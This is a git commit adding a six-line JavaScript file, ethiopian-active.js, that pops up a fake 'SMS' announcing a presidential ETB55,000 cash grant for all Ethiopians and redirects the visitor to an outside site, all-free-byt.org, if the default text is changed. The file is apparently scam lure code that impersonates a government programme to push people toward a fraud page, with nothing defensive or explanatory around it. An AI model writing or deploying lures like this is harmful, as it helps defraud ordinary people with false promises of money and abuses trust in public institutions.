05b5b330669885737fa3eca3639ad5058bddc9fb
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-11-22 22:41:19 -0800

    Create ethiopian-active.js

---
+++ ethiopian-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW ETB55,000'
+password=prompt('SMS: Congratulations You are qualify for President TAYE ATSKE SELASSIE ETB55,000 CASH GRANT FOR ALL ETHIOPIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW ETB55,000');
+if (password != 'WITHDRAW ETB55,000') {
+location.href='https://all-free-byt.org/ethiopian-grant.html';
+}
